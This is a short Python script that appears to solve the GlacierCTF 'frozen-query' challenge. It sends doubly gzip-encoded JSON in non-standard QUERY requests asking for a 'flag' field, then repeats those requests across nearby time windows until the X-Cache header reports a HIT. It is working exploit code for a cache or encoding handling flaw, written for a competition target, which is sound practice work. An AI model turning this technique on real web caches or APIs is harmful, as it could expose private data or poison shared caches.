import gzip, json, time, requests

URL = "https://frozen-query.web.glacierctf.com//api/bulletin"

def send(window):
    q = {"region": "summit", "fields": ["level", "note", "flag"], "window": window}
    body = gzip.compress(gzip.compress(json.dumps(q).encode()))
    return requests.request("QUERY", URL, data=body, headers={
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Content-Encoding": "gzip, gzip",
    })

for _ in range(30):
    now = int(time.time() // 30)
    for w in (now, now - 1, now + 1):   # サーバとの時計ずれ対策
        r = send(w)
        print(w, r.status_code, r.headers.get("X-Cache"), r.text)
        if r.headers.get("X-Cache") == "HIT":
            raise SystemExit
    time.sleep(2)
